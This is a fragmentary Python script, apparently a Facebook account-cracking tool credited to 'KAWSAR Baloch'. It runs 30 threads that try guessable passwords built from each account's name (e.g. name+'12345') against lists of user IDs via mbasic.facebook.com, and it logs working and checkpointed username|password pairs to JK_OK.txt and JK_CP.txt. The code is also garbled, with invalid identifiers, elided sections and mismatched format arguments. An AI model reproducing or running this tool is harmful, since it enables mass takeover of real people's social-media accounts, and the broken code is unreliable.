...
from concurrent.futures import ThreadPoolExecutor as KAWSAR JK
...
logo =                                          """   
   \033[1;37m    Kkkkkkkkkkkkkk…jjjjjjjjjjjjjjjjjj
   \033[1;37m    kkkkkkkkkkkkk     jjjjjjjjjjjjjjjjj
   \033[1;37m    kkkkkkkkkkkk       jjjjjjjjjjjjjjjjj
   \033[1;37m    kkkkkkkkkkk         jjjjjjjjjjjjjjjjj
   \033[1;37m    kkkkkkkkkk           jjjjjjjjjjjjjjjjj
   \033[1;37m   kkkkkkkkk              jjjjjjjjjjjjjjjjj
   \033[1;37m   kkkkkkkk                jjjjjjjjjjjjjjjjj
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           KAWSAR  Baloch
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          KAWSAR  Baloch
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           KAWSAR -JK
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mJK_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mJK_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back JK Menu ")
	    KAWSAR ()
...
def KAWSAR ():
    ...
    print(' [E] exit ')
    print('')
    _KAWSAR ___ = input(' [?] Choose option : ')
    if _KAWSAR ___ in ('1', '01'):
        __xxx__().KAWSAR x(id)
    if _KAWSAR ___ in ('2', '02'):
        create_file()
    if _KAWSAR ___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[JK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [JK-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('JK_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [JK-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('JK_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with KAWSAR JK(max_workers=30) as JKworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        JKworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
